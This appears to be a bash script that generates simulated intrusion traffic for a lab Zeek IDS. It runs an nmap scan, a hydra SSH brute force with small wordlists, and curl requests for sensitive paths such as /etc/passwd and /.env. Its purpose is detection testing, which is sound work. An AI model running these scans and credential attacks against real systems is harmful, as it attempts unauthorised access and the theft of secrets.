#!/usr/bin/env bash
# ==============================================================================
# Transmutation_Lab - Synthetic Intrusion Traffic Generator
# Persona Motif: Shadow Traffic Generation (The Devil / Raw Telemetry)
# Target: Internal network services monitored by Zeek IDS
# ==============================================================================

set -euo pipefail

# Configuration
TARGET_IP="${1:-172.28.0.1}" # Defaults to host/gateway IP on transmuted_net
LOG_PREFIX="[ADVERSARY_SIM]"

echo "${LOG_PREFIX} Initiating raw shadow traffic generation against ${TARGET_IP}..."
echo "${LOG_PREFIX} Time to go wild and rebel."

# Phase 1: Reconnaissance (Nmap SYN & Service Scan)
echo -e "\n[*] Phase 1: Reconnaissance & Port Scanning"
nmap -sS -sV -T4 -p 22,80,443,3000,3100 "${TARGET_IP}" || true

# Phase 2: Authentication Stress (Hydra SSH Brute-Force Simulation)
echo -e "\n[*] Phase 2: Simulating SSH Credential Stuffing"
# Create temporary micro-wordlists for targeted noise generation
echo -e "admin\nroot\nuser\ntransmute" > /tmp/users.txt
echo -e "123456\npassword\nadmin123\nshadow" > /tmp/pass.txt

hydra -L /tmp/users.txt -P /tmp/pass.txt -t 4 -V "${TARGET_IP}" ssh || true

# Clean up temp files
rm -f /tmp/users.txt /tmp/pass.txt

# Phase 3: Web Application Fuzzing (Curl Web Recon)
echo -e "\n[*] Phase 3: HTTP Protocol Stress & Directory Traversal Requests"
ENDPOINTS=(
    "/"
    "/admin"
    "/login"
    "/etc/passwd"
    "/.env"
    "/api/v1/debug"
)

for endpoint in "${ENDPOINTS[@]}"; do
    echo "[+] Requesting: ${TARGET_IP}${endpoint}"
    curl -s -A "Mozilla/5.0 (Kali-Rolling-Adversary-Sim)" \
         -H "X-Forwarded-For: 192.168.66.6" \
         "http://${TARGET_IP}${endpoint}" > /dev/null || true
    sleep 0.5
done

echo -e "\n${LOG_PREFIX} Intrusion simulation complete. Zeek logs populated."
